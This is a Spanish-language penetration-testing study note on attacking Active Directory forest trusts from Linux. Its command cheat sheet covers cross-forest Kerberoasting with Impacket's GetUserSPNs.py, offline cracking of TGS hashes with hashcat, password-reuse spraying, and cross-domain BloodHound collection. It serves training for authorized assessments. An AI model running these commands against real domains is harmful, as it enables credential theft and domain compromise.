---
tags:
  - AD
  - attack
  - linux
  - forest
---
## Conceptos Clave

* Es posible realizar ataques de Kerberoasting a través de una confianza de bosque (cross-forest trust) si se poseen credenciales de un usuario que pueda autenticarse en el dominio destino.
* Si se compromete una cuenta en otro dominio, existe una alta probabilidad de reutilización de contraseñas; los administradores suelen usar las mismas credenciales para cuentas de servicio equivalentes en ambos dominios.
* En relaciones de confianza bidireccionales, es común encontrar miembros de un dominio origen dentro de grupos privilegiados del dominio destino, específicamente mediante el uso de "Domain Local Groups", ya que son los únicos que permiten usuarios externos al bosque.
* Los derechos de Administrador de Dominio (Domain Admin) en un dominio hijo casi siempre permiten escalar privilegios y comprometer el dominio padre usando el ataque ExtraSids.

  
## Herramientas Clave

* **GetUserSPNs.py (Impacket)**: Utilizado para enumerar Service Principal Names (SPNs) y solicitar tickets TGS a través de la relación de confianza desde un host Linux.
* **[Hashcat](../../../📂%2008%20Herramientas&Cheatsheets/Hashcat.md)**: Utilizado para realizar el crackeo offline de los tickets TGS obtenidos (modo 13100).
* **[BloodHound](../../../📂%2008%20Herramientas&Cheatsheets/BloodHound.md)-python**: Implementación en Python de BloodHound usada desde Linux para recopilar datos de múltiples dominios y buscar relaciones de membresía de grupos extranjeros.
* **zip**: Utilizado para comprimir los archivos JSON resultantes de BloodHound en un único archivo para su ingesta en la GUI.

  
## Metodología Paso a Paso

### Fase 1: Reconocimiento y Kerberoasting Cross-Forest

El primer paso es comprobar si nuestra cuenta comprometida actual tiene visibilidad de cuentas de servicio (SPNs) en el dominio de confianza. Si existen cuentas vulnerables, solicitamos el ticket TGS interactuando con el dominio de destino proporcionando las credenciales del dominio origen.


### Fase 2: Cracking y Reutilización de Credenciales

Una vez obtenido el hash del ticket TGS, se crackea offline. Si el ataque tiene éxito, el siguiente paso crítico es verificar si la contraseña descifrada se reutiliza en el dominio actual o en otras cuentas de servicio, ejecutando un ataque de password spray de un solo intento.

  
### Fase 3: Preparación de Entorno para Enumeración (DNS)

Para recolectar datos de Active Directory a través de dominios usando herramientas basadas en Linux (como BloodHound), el host atacante debe poder resolver los nombres de los Controladores de Dominio. Esto requiere modificar manualmente la configuración DNS del sistema para apuntar al DC objetivo.
 

### Fase 4: Búsqueda de Membresías Extranjeras (BloodHound)

Se ejecuta la recolección de datos en ambos dominios (origen y destino) autenticándose con las credenciales disponibles. Posteriormente, los datos se comprimen e importan en la interfaz gráfica de BloodHound para analizar la consulta de "Users with Foreign Domain Group Membership".

## Cheat Sheet de Comandos
```bash
# Enumerar cuentas con SPN en el dominio destino usando credenciales del dominio origen
# -target-domain: Especifica el dominio de confianza objetivo
GetUserSPNs.py -target-domain <TARGET_DOMAIN> <SOURCE_DOMAIN>/<USER>

  
# Solicitar el ticket TGS de las cuentas encontradas en el dominio destino
# -request: Extrae el ticket TGS
# -outputfile: Guarda el hash extraido en un archivo directamente
GetUserSPNs.py -request -target-domain <TARGET_DOMAIN> <SOURCE_DOMAIN>/<USER> -outputfile hashes.txt

  
# Crackear los tickets TGS extraídos con Hashcat
# -m 13100: Especifica el módulo para Kerberos 5 TGS-REP etype 23
hashcat -m 13100 hashes.txt <WORDLIST>

  
# Modificar archivo DNS local temporalmente para resolución del dominio objetivo
sudo nano /etc/resolv.conf
# Contenido a añadir/modificar:
# domain <TARGET_DOMAIN>
# nameserver <TARGET_DC_IP>

  
# Recolectar datos del dominio origen con bloodhound-python
# -d: Dominio objetivo | -dc: Nombre DNS del Domain Controller | -c All: Recolectar todo
bloodhound-python -d <SOURCE_DOMAIN> -dc <SOURCE_DC_HOSTNAME> -c All -u <USER> -p <PASSWORD>

  
# Recolectar datos del dominio destino usando credenciales del dominio origen
bloodhound-python -d <TARGET_DOMAIN> -dc <TARGET_DC_HOSTNAME> -c All -u <USER>@<SOURCE_DOMAIN> -p <PASSWORD>

  
# Comprimir todos los archivos JSON resultantes para subirlos a la GUI de BloodHound
zip -r ad_data_bh.zip *.json
```

  
## Gotchas y Troubleshooting

* **Error de resolución en bloodhound-python:** La herramienta requiere estrictamente el `hostname DNS` del Domain Controller objetivo mediante la bandera `-dc`, no acepta una dirección IP directa. Es obligatorio editar `/etc/resolv.conf` apuntando al servidor DNS interno.

* **Quick Wins de Reutilización:** Incluso si ya tienes control sobre el dominio actual, descubrir reutilización de contraseñas a través de dominios es un hallazgo crítico para el reporte. Si estás atascado en un dominio, crackear una cuenta en un dominio de confianza y probar su contraseña en tu dominio actual puede darte la escalada que necesitas.

* **Aislamiento de Grupos:** Recordar siempre que solo los "Domain Local Groups" permitirán la existencia de usuarios que provengan de fuera de ese bosque de Active Directory.

* **Formato de Usuario Cross-Forest en herramientas:** Al ejecutar `bloodhound-python` contra el dominio destino, el usuario de autenticación debe especificarse incluyendo su dominio de origen (ej. `<USER>@<SOURCE_DOMAIN>`) para que el DC destino sepa a dónde enrutar la autenticación.